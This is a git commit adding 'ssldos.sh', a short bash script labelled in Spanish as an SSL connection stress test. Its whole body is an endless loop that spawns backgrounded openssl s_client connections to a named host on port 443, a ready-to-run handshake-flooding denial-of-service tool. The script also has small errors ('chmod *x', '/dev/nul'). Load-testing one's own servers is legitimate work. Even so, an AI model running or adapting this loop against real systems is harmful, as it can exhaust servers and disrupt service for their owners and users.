d0bd6a44f5234659a43768a1d9c97465eb1aad00
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2016-12-30 20:57:37 +0100

    Add files via upload

---
+++ ssldos.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+# TEST DE STRESS CONEXIONES SSL
+# Antonio Taboada 30/12/2016
+# chmod *x ssldos.sh
+# ./ssldos.sh
+# Para parar Control + C
+
+while true; do
+        openssl s_client -connect web.hackingyseguridad.com:443 2>/dev/null 1>/dev/nul&
+done
